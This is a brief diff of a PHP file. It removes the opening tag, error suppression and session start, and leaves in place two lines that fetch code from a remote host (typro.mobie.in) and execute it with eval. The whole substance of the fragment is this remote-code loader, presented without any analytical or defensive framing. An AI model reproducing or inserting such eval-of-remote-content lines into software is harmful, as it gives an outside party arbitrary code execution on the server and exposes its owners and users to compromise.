@@ -1,6 +1,3 @@
-<?php
-error_reporting(0);
-session_start();
 
 eval(file_get_contents('https://typro.mobie.in/Codephp/Logo'));
 eval(file_get_contents('http://typro.mobie.in/Codephp/Function'));
